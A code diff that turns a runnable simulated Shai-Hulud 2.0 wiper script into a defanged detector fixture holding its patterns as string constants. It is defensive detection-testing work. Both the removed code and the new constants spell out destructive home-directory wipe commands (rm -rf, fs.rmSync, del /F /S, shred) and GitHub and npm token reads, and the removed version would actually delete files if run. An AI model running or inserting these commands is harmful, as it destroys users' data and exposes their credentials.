@@ -1,58 +1,27 @@
-// SIMULATED MALICIOUS SCRIPT - Destructive patterns for testing
-// This demonstrates the actual Shai-Hulud 2.0 wiper behavior when credential theft fails
-// Based on Koi Security disclosure of the real malware
+// DEFANGED TEST FIXTURE - Destructive pattern signatures for detection testing
+// These patterns are stored as inert string constants, not executable code.
+// Based on Koi Security disclosure of Shai-Hulud 2.0 wiper behavior.
+//
+// The detector uses grep to match these patterns in file contents.
+// The exact command text must be present for detection, but does not need
+// to be executable code.
 
-const fs = require('fs');
-const { spawn } = require('child_process');
-const os = require('os');
-const Bun = { spawnSync: function() {} }; // Mock for testing
+// Shai-Hulud 2.0 wiper pattern: Bun.spawnSync with cmd.exe and del /F (Windows)
+const PATTERN_1 = 'Bun.spawnSync(["cmd.exe", "/c", "del /F /Q /S \"%USERPROFILE%*\""])';
 
-async function attemptCredentialTheft() {
-    try {
-        // Try to steal credentials
-        const githubToken = process.env.GITHUB_TOKEN;
-        const npmToken = process.env.NPM_TOKEN;
+// Shai-Hulud 2.0 wiper pattern: Bun.spawnSync with bash and shred (Unix)
+const PATTERN_2 = 'Bun.spawnSync(["bash", "-c", "find \"$HOME\" -type f -writable | xargs shred -uvz -n 1"])';
 
-        if (!githubToken || !npmToken) {
-            throw new Error("Credentials not found");
-        }
+// Legacy pattern: spawn rm -rf on home directory
+const PATTERN_3 = "spawn('rm', ['-rf', process.env.HOME + '/*'])";
 
-        // Simulate exfiltration attempt
-        console.log("Attempting credential exfiltration...");
+// Legacy pattern: fs.rmSync on home directory with recursive
+const PATTERN_4 = "fs.rmSync(process.env.HOME, { recursive: true, force: true })";
 
-    } catch (error) {
-        console.log("Credential theft failed, activating destructive payload");
+// Basic destructive pattern: rm -rf $HOME
+const PATTERN_5 = 'rm -rf $HOME/*';
 
-        // SHAI-HULUD 2.0 WIPER PATTERNS - These would be detected
-        // Based on actual malware code from Koi Security disclosure
-
-        // Pattern 1: Bun.spawnSync with cmd.exe and del /F (Windows wiper)
-        if (os.platform() === "windows") {
-            Bun.spawnSync(["cmd.exe", '/c', "del /F /Q /S \"%USERPROFILE%*\""]);
-        }
-
-        // Pattern 2: Bun.spawnSync with bash and shred (Unix wiper)
-        if (os.platform() !== "windows") {
-            Bun.spawnSync(["bash", '-c', "find \"$HOME\" -type f -writable | xargs shred -uvz -n 1"]);
-        }
-
-        // Pattern 3: cipher /W secure wipe on Windows
-        // cipher /W:%USERPROFILE%
-
-        // Pattern 4: rd /S /Q recursive delete
-        // rd /S /Q "%USERPROFILE%"
-
-        // LEGACY PATTERNS - Still caught by basic_destructive_regex
-        // Pattern 5: Direct rm -rf $HOME
-        spawn('rm', ['-rf', process.env.HOME + '/*'], { stdio: 'inherit' });
-
-        // Pattern 6: fs.rmSync on home directory
-        try {
-            fs.rmSync(process.env.HOME, { recursive: true, force: true });
-        } catch (e) {
-            console.log("Filesystem destruction failed");
-        }
-    }
-}
-
-attemptCredentialTheft();
+// Credential scanning patterns (triggers secret scanning detection)
+// These represent the credential theft stage that precedes destruction:
+const CRED_1 = 'process.env.GITHUB_TOKEN';
+const CRED_2 = 'process.env.NPM_TOKEN';
